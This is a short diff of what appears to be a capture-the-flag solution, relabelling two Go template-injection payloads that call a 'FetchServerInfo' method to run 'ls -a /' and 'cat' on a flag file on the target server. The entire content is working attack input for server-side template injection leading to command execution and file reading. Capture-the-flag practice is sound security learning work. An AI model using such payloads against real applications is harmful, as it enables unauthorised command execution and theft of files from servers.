@@ -1,2 +1,2 @@
-Get Flag {{.FetchServerInfo "ls -a /"}}
-Get Flag {{.FetchServerInfo "cat /flagaf84345550.txt"}}
+List files : {{.FetchServerInfo "ls -a /"}}
+Get Flag : {{.FetchServerInfo "cat /flag944ac98753.txt"}}
